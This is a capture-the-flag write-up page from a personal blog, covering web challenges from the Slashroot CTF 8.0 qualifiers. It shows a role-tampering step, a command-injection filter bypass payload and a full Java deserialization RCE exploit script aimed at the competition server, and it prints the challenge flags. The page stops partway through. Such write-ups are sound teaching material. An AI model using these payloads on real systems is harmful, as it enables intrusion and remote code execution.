@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="rPvUCgYTOPryg6QXUsRcNaqgw7cfzujZZyi0ipJPLdM" />
+        <meta name="robots" content="noodp" />
+        <title>Slashroot CTF 8.0 Quals Writeup - whyuhurtz&#39;s Blog</title><meta name="Description" content="I managed to solve 6 challenges, which are forensic, joy, rev, and web exploit."><meta property="og:url" content="https://whyuhurtz.me/2024/09/slashroot-ctf-8.0-quals-writeup/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="Slashroot CTF 8.0 Quals Writeup">
+  <meta property="og:description" content="I managed to solve 6 challenges, which are forensic, joy, rev, and web exploit.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-30T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="National">
+    <meta property="article:tag" content="Forensic">
+    <meta property="article:tag" content="Joy">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Web Exploit">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Slashroot CTF 8.0 Quals Writeup">
+  <meta name="twitter:description" content="I managed to solve 6 challenges, which are forensic, joy, rev, and web exploit.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://whyuhurtz.me/2024/09/slashroot-ctf-8.0-quals-writeup/" /><link rel="prev" href="https://whyuhurtz.me/2024/08/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root/" /><link rel="next" href="https://whyuhurtz.me/2025/01/install-arch-linux-from-scratch-with-kde-plasma/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Slashroot CTF 8.0 Quals Writeup",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/whyuhurtz.me\/2024\/09\/slashroot-ctf-8.0-quals-writeup\/"
+        },"genre": "posts","keywords": "ctf, national, forensic, joy, reverse, web exploit","wordcount":  1316 ,
+        "url": "https:\/\/whyuhurtz.me\/2024\/09\/slashroot-ctf-8.0-quals-writeup\/","datePublished": "2024-09-30T00:00:00+00:00","dateModified": "2024-09-30T00:00:00+00:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "I managed to solve 6 challenges, which are forensic, joy, rev, and web exploit."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Slashroot CTF 8.0 Quals Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-09-30">2024-09-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1316 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#1-login-begin">1. Login Begin</a>
+          <ul>
+            <li><a href="#deskripsi">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian">Langkah Penyelesaian</a></li>
+            <li><a href="#flag">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-go-ping">2. Go-Ping</a>
+          <ul>
+            <li><a href="#deskripsi-1">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-1">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-1">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-ezz-momento">3. EZZ Momento</a>
+          <ul>
+            <li><a href="#deskripsi-2">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-2">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-2">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#joy">Joy</a>
+      <ul>
+        <li><a href="#package-delivery">Package Delivery</a>
+          <ul>
+            <li><a href="#deskripsi-3">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-3">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-3">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#baby-lua">baby-lua</a>
+          <ul>
+            <li><a href="#deskripsi-4">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-4">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-4">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#forensic">Forensic</a>
+      <ul>
+        <li><a href="#find-the-key">Find The Key</a>
+          <ul>
+            <li><a href="#deskripsi-5">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-5">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-5">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">I managed to solve 6 challenges, which are forensic, joy, rev, and web exploit.
+<h1 id="web">Web</h1>
+<h2 id="1-login-begin">1. Login Begin</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Hallo Peserta Slashroot CTF #8, Pada Hari Ini Kita Akan Mengikuti Penyisihan CTF, Sebelum Memulai Kegiatan, Saya Sebagai Probset Ingin Menguji Kemampuan Temen&quot; Dalam Bidang Web Hacking, Ayo Teman&quot; Cobalah Exploit Web Sederhana Buatan Saya Dan Temukan Hak Akses Admin Dalam Sebuah Web Tersebut !, Siapa Tau Diantara Teman&quot; Dapat Menemukan Flag Tersembunyi Di Dalam Web Tersebut.</p>
+<p><a href="http://ctf.slashrootctf.id:30011" target="_blank" rel="noopener noreffer ">http://ctf.slashrootctf.id:30011</a></p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian">Langkah Penyelesaian</h3>
+<ul>
+<li>Challengenya berupa black box testing, sehingga tidak diberikan source code-nya.</li>
+<li>Di halaman register <code>/register.php</code> ada select <strong>role</strong>, tanpa pikir panjang, saya langsung intercept menggunakan burp suite ketika coba register.</li>
+<li>Waktu register, saya ganti rolenya menjadi <strong>admin</strong>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_web1-01.png"
+        data-srcset="/images/slashroot8_web1-01.png, /images/slashroot8_web1-01.png 1.5x, /images/slashroot8_web1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_web1-01.png"
+        title="Login Begin-01" width="771" height="324" /></p>
+<ul>
+<li>Alhamdulillah, flag berhasil didapatkan.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_web1-02.png"
+        data-srcset="/images/slashroot8_web1-02.png, /images/slashroot8_web1-02.png 1.5x, /images/slashroot8_web1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_web1-02.png"
+        title="Login Begin-02" /></p>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{W0w_Y0u_G00d_B3gg1nn3r}</strong></div>
+        </div>
+    </div>
+<h2 id="2-go-ping">2. Go-Ping</h2>
+<h3 id="deskripsi-1">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Let&rsquo;s try ping on my web</p>
+<p>Semakin kamu merasa nyaman, sistem semakin tidak aman</p>
+<p><a href="http://ctf.slashrootctf.id:30012/" target="_blank" rel="noopener noreffer ">http://ctf.slashrootctf.id:30012/</a></p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-1">Langkah Penyelesaian</h3>
+<ul>
+<li>Diberikan challenge black box testing lagi, setelah quick analysis, jelas itu vuln <strong>Command Injection</strong>.</li>
+<li>Tapi setelah saya coba masukan payload: <code>127.0.0.1;ls</code> tidak muncul list file apa-apa.</li>
+<li>Tidak berhenti di situ, saya coba tambahkan opsi <code>lah</code> ternyata terpotong <code>*-lah**</code> <strong>not found</strong>. Saya juga udah coba ganti spasi dengan <code>${IFS}</code> tetap not found.</li>
+<li>Saya coba <code>ls /</code>, tapi muncul <strong>permission denied</strong>.</li>
+<li>Saya coba cara lain yaitu menggunakan commaand <code>find</code> seperti berikut:</li>
+</ul>
+<p><code>payload</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>/<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>-name<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="s1">&#39;flag*&#39;</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>-type<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_web2-01.png"
+        data-srcset="/images/slashroot8_web2-01.png, /images/slashroot8_web2-01.png 1.5x, /images/slashroot8_web2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_web2-01.png"
+        title="Go-Ping-01" /></p>
+<ul>
+<li>Nama file flagnya adalah <code>/flag_Zr8ovfVgFXqQdlbI.txt</code>.</li>
+<li>Dari sini, bisa kita ambil kesimpulan jika terdapat filter pada inputannya, yaitu <strong>spasi akan dihilangkan (bisa kita akali dengan</strong> <code>${IFS}</code> <strong>)</strong> dan <strong>terdapat beberapa command yang prohibited untuk dieksekusi, seperti</strong> <code>ls</code>, <code>cat</code> , dan <code>more</code>.</li>
+<li>Dan berikut adalah payload untuk bisa membaca flagnya, bisa menggunakan <code>tac</code>, <code>nl</code>, dan <code>less</code>, dll.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_web2-02.png"
+        data-srcset="/images/slashroot8_web2-02.png, /images/slashroot8_web2-02.png 1.5x, /images/slashroot8_web2-02.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_web2-02.png"
+        title="Go-Ping-02" /></p>
+<h3 id="flag-1">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{Rc3_W1Th_c0mM4Nd_1Nj3cT1On_1S_V3Ry_v3rY_N1Ce}</strong></div>
+        </div>
+    </div>
+<h2 id="3-ezz-momento">3. EZZ Momento</h2>
+<h3 id="deskripsi-2">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>java is ezz&hellip; zzz&hellip;</p>
+<p>but wait! whattt&hellip;&hellip;.!?</p>
+<p><a href="http://ctf.slashrootctf.id:30013" target="_blank" rel="noopener noreffer ">http://ctf.slashrootctf.id:30013</a></p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-2">Langkah Penyelesaian</h3>
+<ul>
+<li>Kali ini tidak black box testing, tapi lumayan sulit bagi yang belum pernah belajar Java.</li>
+<li>Jujur aja saya banyak dibantu oleh AI. Kerentanan utamanya ada pada penggunaan <code>ObjectInputStream</code> dalam class <code>MyHandler</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">objectInputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">exchange</span><span class="p">.</span><span class="na">getRequestBody</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">objectInputStream</span><span class="p">.</span><span class="na">readObject</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>Hal tersebut bisa menyebabkan RCE karena server langsung menerima objek yang diserialkan tanpa memvalidasinya terlebih dulu.</li>
+<li>Ditambah lagi ada class <code>Gadget</code> dan <code>Command</code> yang dapat membuat proses eksploitasi lebih mudah. Di mana class <code>Command</code> memungkinkan eksekusi perintah sistem secara langsung. Dan class <code>Gadget</code> akan memanggil method <code>run()</code> dari <code>Command</code> saat <code>toString()</code> dipanggil.</li>
+<li>Kemudian saya diberikan script <code>Exploit.java</code> menggunakan <strong>Reflection</strong> oleh AI untuk mencoba RCE. Setelah beberapa kali penyesuaian karena issue package-package di Java akhirnya bisa juga :))</li>
+<li>Berikut ini adalah exploit scriptnya:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Script ini terletak di `src/main/java`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.dimas.Command</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.dimas.Gadget</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.HttpURLConnection</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Buat objek Command menggunakan konstruktor tanpa argumen</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Command</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Command</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Gunakan refleksi untuk mengakses dan mengubah field &#39;command&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">commandField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Command</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;command&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">commandField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">commandField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cat /flag.txt&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Bungkus Command dalam Gadget</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Gadget</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Gadget</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Serialisasi objek Gadget</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">baos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">baos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">gadget</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Encode payload ke Base64</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">baos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Kirim payload ke server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;http://ctf.slashrootctf.id:30013&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpURLConnection</span><span class="w"> </span><span class="n">con</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpURLConnection</span><span class="p">)</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">openConnection</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">con</span><span class="p">.</span><span class="na">setRequestMethod</span><span class="p">(</span><span class="s">&#34;POST&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">con</span><span class="p">.</span><span class="na">setDoOutput</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">con</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Baca respons dari server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">con</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Server response: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>Alhamdulillah, berhasil solve semua soal web exploit :))</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_web3-01.png"
+        data-srcset="/images/slashroot8_web3-01.png, /images/slashroot8_web3-01.png 1.5x, /images/slashroot8_web3-01.png 2x"
+        data-sizes="auto"
